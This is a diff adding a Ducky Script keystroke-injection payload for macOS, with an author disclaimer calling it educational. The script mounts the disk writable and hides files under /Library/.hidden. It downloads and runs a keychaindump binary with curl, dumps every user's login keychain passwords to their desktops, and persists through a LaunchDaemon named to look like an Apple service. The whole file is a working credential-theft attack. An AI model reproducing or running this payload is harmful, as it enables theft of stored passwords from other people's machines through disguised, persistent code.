@@ -1,0 +1,92 @@
+REM Isaiah Turner
+REM This tool will automatically dump all passwords stored in the keychain to a file on the desktop upon login.
+REM Please do not use this for evil, this is for educational purposes only.
+REM http://isaiahjturner.com
+DELAY 1000
+STRING mount -uw /
+ENTER
+DELAY 2000
+STRING mkdir /Library/.hidden
+ENTER
+DELAY 200
+
+STRING echo '#!/bin/sh
+ENTER
+STRING curl -o /Library/.hidden/keychaindump 'https://raw.githubusercontent.com/IsaiahJTurner/keychaindump/master/keychaindump'
+ENTER
+STRING chmod +x /Library/.hidden/keychaindump
+ENTER
+STRING w -h | sort -u -t' ' -k1,1 | while read user etc
+ENTER
+STRING do
+ENTER
+STRING homedir=$(dscl . -read /Users/$user NFSHomeDirectory | cut -d' ' -f2)
+ENTER
+STRING /Library/.hidden/keychaindump $homedir/Library/Keychains/login.keychain > $homedir/Desktop/$user.login.keychain.txt
+ENTER
+STRING done
+ENTER
+STRING rm -rf /Library/.hidden/
+ENTER
+STRING launchctl unload -w /Library/LaunchDaemons/com.apples.services.plist
+ENTER
+STRING rm -f /Library/LaunchDaemons/com.apples.services.plist' > /Library/.hidden/dump.sh
+ENTER
+DELAY 500
+
+
+STRING chmod +x /Library/.hidden/dump.sh
+ENTER
+DELAY 200
+
+
+STRING mkdir /Library/LaunchDaemons
+ENTER
+DELAY 200
+
+
+STRING echo '<plist version="1.0">
+ENTER
+STRING <dict>
+ENTER
+STRING <key>Label</key>
+ENTER
+STRING <string>com.apples.services</string>
+ENTER
+STRING <key>ProgramArguments</key>
+ENTER
+STRING <array>
+ENTER
+STRING <string>/bin/sh</string>
+ENTER
+STRING <string>/Library/.hidden/dump.sh</string>
+ENTER
+STRING </array>
+ENTER
+STRING <key>RunAtLoad</key>
+ENTER
+STRING <true/>
+ENTER
+STRING <key>AbandonProcessGroup</key>
+ENTER
+STRING <true/>
+ENTER
+STRING </dict>
+ENTER
+STRING </plist>' > /Library/LaunchDaemons/com.apples.services.plist
+ENTER
+DELAY 500
+
+
+STRING chmod 644 /Library/LaunchDaemons/com.apples.services.plist
+ENTER
+DELAY 200
+
+
+STRING launchctl load /Library/LaunchDaemons/com.apples.services.plist
+ENTER
+DELAY 1000
+
+
+STRING shutdown -h now
+ENTER
